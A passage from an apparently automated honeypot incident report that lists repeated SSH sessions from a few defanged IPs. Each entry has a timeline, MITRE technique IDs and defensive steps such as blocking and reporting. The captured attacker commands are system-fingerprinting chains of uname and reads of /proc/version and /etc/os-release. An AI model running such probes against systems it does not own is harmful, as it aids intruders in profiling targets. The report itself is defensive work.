| `2026-07-06 04:21:27` | `cowrie.command.input` |
| `2026-07-06 04:21:28` | `cowrie.log.closed` |
| `2026-07-06 04:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b9c778316b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:22 |
| **Last Seen** | 2026-07-06 04:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:22:15` | `cowrie.session.connect` |
| `2026-07-06 04:22:15` | `cowrie.client.version` |
| `2026-07-06 04:22:15` | `cowrie.client.kex` |
| `2026-07-06 04:22:19` | `cowrie.login.success` |
| `2026-07-06 04:22:21` | `cowrie.session.params` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.success` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:21` | `cowrie.command.input` |
| `2026-07-06 04:22:22` | `cowrie.log.closed` |
| `2026-07-06 04:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e50a0fa407f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:22 |
| **Last Seen** | 2026-07-06 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:22:38` | `cowrie.session.connect` |
| `2026-07-06 04:22:38` | `cowrie.client.version` |
| `2026-07-06 04:22:38` | `cowrie.client.kex` |
| `2026-07-06 04:22:38` | `cowrie.login.success` |
| `2026-07-06 04:22:39` | `cowrie.session.params` |
| `2026-07-06 04:22:39` | `cowrie.command.input` |
| `2026-07-06 04:22:39` | `cowrie.log.closed` |
| `2026-07-06 04:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d5e2fa4831

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:23 |
| **Last Seen** | 2026-07-06 04:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:23:08` | `cowrie.session.connect` |
| `2026-07-06 04:23:08` | `cowrie.client.version` |
| `2026-07-06 04:23:08` | `cowrie.client.kex` |
| `2026-07-06 04:23:12` | `cowrie.login.success` |
| `2026-07-06 04:23:14` | `cowrie.session.params` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.success` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:14` | `cowrie.command.input` |
| `2026-07-06 04:23:15` | `cowrie.log.closed` |
| `2026-07-06 04:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3222b14c5f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:24 |
| **Last Seen** | 2026-07-06 04:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:24:00` | `cowrie.session.connect` |
| `2026-07-06 04:24:01` | `cowrie.client.version` |
| `2026-07-06 04:24:01` | `cowrie.client.kex` |
| `2026-07-06 04:24:04` | `cowrie.login.success` |
| `2026-07-06 04:24:06` | `cowrie.session.params` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.success` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:06` | `cowrie.command.input` |
| `2026-07-06 04:24:07` | `cowrie.log.closed` |
| `2026-07-06 04:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82caac3283d1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:24 |
| **Last Seen** | 2026-07-06 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:24:28` | `cowrie.session.connect` |
| `2026-07-06 04:24:28` | `cowrie.client.version` |
| `2026-07-06 04:24:28` | `cowrie.client.kex` |
| `2026-07-06 04:24:28` | `cowrie.login.success` |
| `2026-07-06 04:24:29` | `cowrie.session.params` |
| `2026-07-06 04:24:29` | `cowrie.command.input` |
| `2026-07-06 04:24:29` | `cowrie.log.closed` |
| `2026-07-06 04:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c89b4149009

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:24 |
| **Last Seen** | 2026-07-06 04:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:24:51` | `cowrie.session.connect` |
| `2026-07-06 04:24:51` | `cowrie.client.version` |
| `2026-07-06 04:24:51` | `cowrie.client.kex` |
| `2026-07-06 04:24:55` | `cowrie.login.success` |
| `2026-07-06 04:24:57` | `cowrie.session.params` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.success` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:57` | `cowrie.command.input` |
| `2026-07-06 04:24:58` | `cowrie.log.closed` |
| `2026-07-06 04:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72891a72c76c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:25 |
| **Last Seen** | 2026-07-06 04:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:25:43` | `cowrie.session.connect` |
| `2026-07-06 04:25:44` | `cowrie.client.version` |
| `2026-07-06 04:25:44` | `cowrie.client.kex` |
| `2026-07-06 04:25:47` | `cowrie.login.success` |
| `2026-07-06 04:25:49` | `cowrie.session.params` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.success` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:49` | `cowrie.command.input` |
| `2026-07-06 04:25:50` | `cowrie.log.closed` |
| `2026-07-06 04:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cae722a5e43

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:26 |
| **Last Seen** | 2026-07-06 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:26:16` | `cowrie.session.connect` |
| `2026-07-06 04:26:16` | `cowrie.client.version` |
| `2026-07-06 04:26:16` | `cowrie.client.kex` |
| `2026-07-06 04:26:16` | `cowrie.login.success` |
| `2026-07-06 04:26:17` | `cowrie.session.params` |
| `2026-07-06 04:26:17` | `cowrie.command.input` |
| `2026-07-06 04:26:17` | `cowrie.log.closed` |
| `2026-07-06 04:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2010be3cd81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:26 |
| **Last Seen** | 2026-07-06 04:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:26:34` | `cowrie.session.connect` |
| `2026-07-06 04:26:35` | `cowrie.client.version` |
| `2026-07-06 04:26:35` | `cowrie.client.kex` |
| `2026-07-06 04:26:38` | `cowrie.login.success` |
| `2026-07-06 04:26:40` | `cowrie.session.params` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.success` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.command.input` |
| `2026-07-06 04:26:40` | `cowrie.log.closed` |
| `2026-07-06 04:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1b91a0e8b93

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:27 |
| **Last Seen** | 2026-07-06 04:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:27:26` | `cowrie.session.connect` |
| `2026-07-06 04:27:27` | `cowrie.client.version` |
| `2026-07-06 04:27:27` | `cowrie.client.kex` |
| `2026-07-06 04:27:29` | `cowrie.login.success` |
| `2026-07-06 04:27:32` | `cowrie.session.params` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.success` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:32` | `cowrie.command.input` |
| `2026-07-06 04:27:33` | `cowrie.log.closed` |
| `2026-07-06 04:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6bd39365de

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:28 |
| **Last Seen** | 2026-07-06 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:28:08` | `cowrie.session.connect` |
| `2026-07-06 04:28:08` | `cowrie.client.version` |
| `2026-07-06 04:28:08` | `cowrie.client.kex` |
| `2026-07-06 04:28:08` | `cowrie.login.success` |
| `2026-07-06 04:28:09` | `cowrie.session.params` |
| `2026-07-06 04:28:09` | `cowrie.command.input` |
| `2026-07-06 04:28:09` | `cowrie.log.closed` |
| `2026-07-06 04:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02bb67435ffc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:28 |
| **Last Seen** | 2026-07-06 04:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:28:18` | `cowrie.session.connect` |
| `2026-07-06 04:28:18` | `cowrie.client.version` |
| `2026-07-06 04:28:18` | `cowrie.client.kex` |
| `2026-07-06 04:28:21` | `cowrie.login.success` |
| `2026-07-06 04:28:23` | `cowrie.session.params` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.success` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:23` | `cowrie.command.input` |
| `2026-07-06 04:28:24` | `cowrie.log.closed` |
| `2026-07-06 04:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d73ba421ab4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:29 |
| **Last Seen** | 2026-07-06 04:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:29:09` | `cowrie.session.connect` |
| `2026-07-06 04:29:09` | `cowrie.client.version` |
| `2026-07-06 04:29:09` | `cowrie.client.kex` |
| `2026-07-06 04:29:13` | `cowrie.login.success` |
| `2026-07-06 04:29:15` | `cowrie.session.params` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.success` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.command.input` |
| `2026-07-06 04:29:15` | `cowrie.log.closed` |
| `2026-07-06 04:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f450731eff

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 04:29 |
| **Last Seen** | 2026-07-06 04:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:29:11` | `cowrie.session.connect` |
| `2026-07-06 04:29:13` | `cowrie.client.version` |
| `2026-07-06 04:29:13` | `cowrie.client.kex` |
| `2026-07-06 04:29:20` | `cowrie.login.success` |
| `2026-07-06 04:29:23` | `cowrie.session.params` |
| `2026-07-06 04:29:23` | `cowrie.command.input` |
| `2026-07-06 04:29:25` | `cowrie.log.closed` |
| `2026-07-06 04:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e223dd2616

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:29 |
| **Last Seen** | 2026-07-06 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:29:56` | `cowrie.session.connect` |
| `2026-07-06 04:29:56` | `cowrie.client.version` |
| `2026-07-06 04:29:56` | `cowrie.client.kex` |
| `2026-07-06 04:29:57` | `cowrie.login.success` |
| `2026-07-06 04:29:57` | `cowrie.session.params` |
| `2026-07-06 04:29:57` | `cowrie.command.input` |
| `2026-07-06 04:29:57` | `cowrie.log.closed` |
| `2026-07-06 04:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c4af6c3721

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:29 |
| **Last Seen** | 2026-07-06 04:30 |
| **Session Duration** | 7s |
